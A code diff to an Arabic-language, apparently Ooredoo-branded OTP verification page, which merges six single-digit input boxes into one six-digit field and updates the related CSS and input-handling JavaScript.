@@ -41,7 +41,8 @@
   .logo-placeholder {
     display: flex;
     align-items: center;
-    height: 62px;
+    justify-content: center;
+    height: 72px;
     width: auto;
   }
   
@@ -50,6 +51,9 @@
     width: auto;
     max-width: 220px;
     object-fit: contain;
+    display: block;
+    transform: scale(1.3);
+    transform-origin: center;
   }
   .header-actions { display: flex; align-items: center; gap: 12px; }
 
@@ -139,22 +143,23 @@
     line-height: 1.5;
   }
 
-  /* حقول إدخال الأرقام */
+  /* حقل إدخال الرمز */
   .otp-inputs {
     display: flex;
-    gap: 10px;
     justify-content: center;
     margin-bottom: 24px;
   }
 
   .otp-input {
-    width: 48px;
-    height: 48px;
+    width: 100%;
+    max-width: 300px;
+    height: 56px;
     border: 2px solid var(--line);
-    border-radius: 8px;
+    border-radius: 12px;
     text-align: center;
-    font-size: 1.5rem;
+    font-size: 1.4rem;
     font-weight: 700;
+    letter-spacing: 0.3rem;
     font-family: 'Cairo', Tahoma, Arial, sans-serif;
     color: var(--text);
     background: var(--white);
@@ -170,6 +175,7 @@
 
   .otp-input::placeholder {
     color: var(--text-light);
+    letter-spacing: 0;
   }
 
   /* زر التحقق */
@@ -297,12 +303,7 @@
     
     <form id="otpForm">
       <div class="otp-inputs" id="otpInputs">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 1">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 2">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 3">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 4">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 5">
-        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="رقم 6">
+        <input type="text" class="otp-input" maxlength="6" inputmode="numeric" placeholder="123456" aria-label="رمز التحقق">
       </div>
       
       <button type="submit" class="verify-btn" id="verifyBtn" disabled>تحقق من الرمز</button>
@@ -324,8 +325,8 @@
     window.location.href = 'otp_ooredoo_en.html';
   });
 
-  // معالجة حقول OTP
-  const otpInputs = document.querySelectorAll('.otp-input');
+  // معالجة حقل OTP الواحد
+  const otpInput = document.querySelector('.otp-input');
   const verifyBtn = document.getElementById('verifyBtn');
   const otpForm = document.getElementById('otpForm');
   const errorAlert = document.getElementById('errorAlert');
@@ -345,42 +346,21 @@
     errorAlert.classList.remove('show');
   });
 
-  otpInputs.forEach((input, index) => {
-    input.addEventListener('input', (e) => {
-      // السماح فقط بالأرقام
-      if (!/^\d*$/.test(input.value)) {
-        input.value = '';
-        return;
-      }
+  otpInput.addEventListener('input', (e) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
+    otpInput.value = value;
+    verifyBtn.disabled = value.length !== 6;
+  });
 
-      // الانتقال للحقل التالي تلقائياً
-      if (input.value && index < otpInputs.length - 1) {
-        otpInputs[index + 1].focus();
-      }
-
-      // التحقق من اكتمال جميع الحقول
-      const allFilled = Array.from(otpInputs).every(inp => inp.value !== '');
-      verifyBtn.disabled = !allFilled;
-    });
-
-    // الحذف والعودة للحقل السابق
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && index > 0) {
-        otpInputs[index - 1].focus();
-      }
-    });
-
-    // منع عدم الأرقام
-    input.addEventListener('keypress', (e) => {
-      if (!/\d/.test(e.key)) {
-        e.preventDefault();
-      }
-    });
+  otpInput.addEventListener('keydown', (e) => {
+    if (!/\d/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
+      e.preventDefault();
+    }
   });
 
   otpForm.addEventListener('submit', (e) => {
     e.preventDefault();
-    const otp = Array.from(otpInputs).map(inp => inp.value).join('');
+    const otp = otpInput.value.trim();
     
     if (otp.length === 6) {
       // حفظ الرمز في sessionStorage وذهاب إلى صفحة التحميل
